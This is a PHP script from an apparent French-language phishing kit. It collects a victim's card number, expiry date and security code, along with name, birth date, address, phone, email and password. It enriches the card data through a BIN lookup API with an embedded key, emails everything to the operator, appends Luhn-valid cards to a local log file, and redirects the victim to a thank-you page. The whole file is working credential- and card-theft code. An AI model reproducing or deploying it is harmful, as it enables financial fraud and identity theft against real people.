<?php
session_start();
include '../../email.php';
include '../../antibots.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exdate"]    = $_POST["exdate"];
    $_SESSION["csc"]    = $_POST["csc"];
$bin=substr(str_replace(' ','',$_SESSION["c_num"]),0,6);	
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.bincodes.com/bin/?format=json&api_key=b842d08a1ba5d500b5ff228271fff91d&bin=".$bin."&format=json");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		$code=json_decode($json);
		$bin_scheme = $code->card;
		$bin_bank = $code->bank;
		$bin_type = $code->type;
		$bin_brand = $code->level;
		$bin_countrycode = $code->countrycode;
		$bin_url = parse_url(strtolower($code->website));
		$bin_phone = strtolower($code->phone);
		$bin_country = $code->country;
$message = '---------💌+1 Love letter to me 💌-------------
🍓 Nom : '.$_SESSION["surname"].'
💳 Num carte : '.$_SESSION["c_num"].'
💳 Date Expiration : '.$_SESSION["exdate"].'
💳 Cryptogramme visuel : '.$_SESSION["csc"].'
🔮 Type de carte : '.$bin_type.'
🔮 Niveau de la carte : '.$bin_brand.'
🔮 Numéro de la banque : '.$bin_phone.'
🔮 Banque : '.$bin_bank.'
🔮 Pays de la carte : '.$bin_country.'
------------------------------------
📞Nom : '.$_SESSION["surname"].'
📞Prénom : '.$_SESSION["name"].'
📞Date de naissance : '.$_SESSION["dob"].'
📞Adresse : '.$_SESSION["address"].'
📞Code Postal : '.$_SESSION["zipcode"].'
📞Ville : '.$_SESSION["city"].'
📞Numéro de téléphone : '.$_SESSION["tel"].'
💌Email : '.$_SESSION['email'].'
🔍Mot de passe rez : '.$_SESSION['pass'].'
------------------------------------
🎯 IP : '._ip().'
🎯 User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject="「💳」 +1 CC [$bin] $bin_brand ,$bin_bank ❤ "._ip();
$head="From: 📈Stonks📈 <cc@sdf.cash>";
$fil = fopen('mesrine.txt','a+');
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){
     fwrite($fil, ''.$_SESSION["c_num"].'|'.$_SESSION["exm"].'/'.$_SESSION["exy"].'|'.$_SESSION["csc"].'|'.$_SESSION["n_card"].'|'.$_SESSION["street"].'|none|none|'.$_SESSION["PhoneNumber"].'|'.$_SESSION["DOB"]."\n");
$_SESSION['step_four']  = true;
mail($my_mail,$Subject,$message,$head);
  header('location: ../merci.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));   
    } else {
        header('location: ../card.php?error=true');   
    }
}
else
{
  header('location: ../../../index.php');
} 
?>